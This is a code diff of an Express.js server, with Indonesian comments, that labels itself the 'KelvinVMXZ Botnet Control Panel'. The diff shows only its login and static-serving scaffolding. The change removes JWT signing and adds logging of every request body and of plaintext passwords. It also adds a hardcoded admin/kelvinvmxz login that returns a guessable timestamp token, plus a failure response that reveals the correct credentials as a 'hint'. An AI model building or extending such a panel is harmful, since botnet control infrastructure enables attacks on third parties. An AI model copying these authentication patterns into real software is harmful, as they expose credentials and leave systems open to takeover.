@@ -1,64 +1,69 @@
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
-const jwt = require('jsonwebtoken');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const JWT_SECRET = process.env.JWT_SECRET || 'kelvinvmxz_super_secret_key_2024';
 
-// Middleware - HARUS SEBELUM ROUTES
-app.use(cors({
-    origin: '*',
-    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
-    allowedHeaders: ['Content-Type', 'Authorization']
-}));
+// MIDDLEWARE - HARUS PERTAMA
+app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+
+// LOG SEMUA REQUEST
+app.use((req, res, next) => {
+    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
+    console.log('Body:', req.body);
+    next();
+});
 
 // Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Debug middleware
-app.use((req, res, next) => {
-    console.log(`${req.method} ${req.url}`);
-    next();
-});
-
-// API Routes
+// API ROUTES
 app.get('/api/health', (req, res) => {
-    console.log('Health check called');
+    console.log('Health check OK');
     res.json({ 
         status: 'OK', 
-        timestamp: new Date().toISOString(),
-        message: 'KelvinVMXZ API is running'
+        message: 'KelvinVMXZ API is running',
+        timestamp: new Date().toISOString()
     });
 });
 
-// SIMPLE LOGIN - NO BCRYPT FOR NOW
+// LOGIN ENDPOINT - SIMPLE VERSION
 app.post('/api/login', (req, res) => {
-    console.log('Login attempt received:', req.body);
+    console.log('=== LOGIN ATTEMPT ===');
+    console.log('Username received:', req.body.username);
+    console.log('Password received:', req.body.password);
+    console.log('Full body:', req.body);
+    
+    // Cek jika request body kosong
+    if (!req.body || !req.body.username || !req.body.password) {
+        console.log('Missing username or password');
+        return res.status(400).json({ 
+            error: 'Username and password required',
+            received: req.body
+        });
+    }
     
     const { username, password } = req.body;
     
-    // SIMPLE CHECK - NO BCRYPT
-    if (username === 'admin' && password === 'kelvinvmxz') {
-        console.log('Login SUCCESS');
+    // TRIM dan lowercase untuk aman
+    const user = username.toString().trim().toLowerCase();
+    const pass = password.toString().trim();
+    
+    console.log('Checking:', user, 'vs admin');
+    console.log('Password:', pass, 'vs kelvinvmxz');
+    
+    // SIMPLE CHECK - TANPA JWT DULU
+    if (user === 'admin' && pass === 'kelvinvmxz') {
+        console.log('✅ LOGIN SUCCESS');
         
-        const token = jwt.sign(
-            { 
-                id: 1, 
-                username: 'admin', 
-                role: 'owner', 
-                plan: 'ultimate' 
-            },
-            JWT_SECRET,
-            { expiresIn: '24h' }
-        );
-        
+        // Return simple token dulu
         return res.json({
             success: true,
-            token: token,
+            message: 'Login successful',
+            token: 'kelvinvmxz_demo_token_' + Date.now(),
             user: {
                 id: 1,
                 username: 'admin',
@@ -71,37 +76,29 @@ app.post('/api/login', (req, res) => {
         });
     }
     
-    console.log('Login FAILED');
-    res.status(401).json({ 
+    console.log('❌ LOGIN FAILED');
+    console.log('Expected: admin / kelvinvmxz');
+    console.log('Received:', user, '/', pass);
+    
+    return res.status(401).json({ 
         success: false,
-        error: 'Invalid username or password' 
+        error: 'Invalid username or password',
+        hint: 'Use admin / kelvinvmxz',
+        received: { username: user, password_length: pass.length }
     });
 });
 
-// Handle preflight OPTIONS
-app.options('*', (req, res) => {
-    res.header('Access-Control-Allow-Origin', '*');
-    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-    res.sendStatus(200);
-});
-
-// Serve SPA
+// ALL OTHER ROUTES GO TO INDEX.HTML
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Error handling
-app.use((err, req, res, next) => {
-    console.error('Server error:', err);
-    res.status(500).json({ error: 'Internal server error' });
-});
-
+// START SERVER
 app.listen(PORT, () => {
-    console.log('=========================================');
-    console.log('🚀 KelvinVMXZ Botnet Control Panel');
-    console.log(`📡 Port: ${PORT}`);
-    console.log('🔗 URL: http://localhost:' + PORT);
+    console.log('\n=========================================');
+    console.log('🚀 KELVINVMXZ BOTNET CONTROL PANEL');
+    console.log(`📡 Server running on port ${PORT}`);
+    console.log(`🌐 http://localhost:${PORT}`);
     console.log('🔑 Login: admin / kelvinvmxz');
-    console.log('=========================================');
+    console.log('=========================================\n');
 });
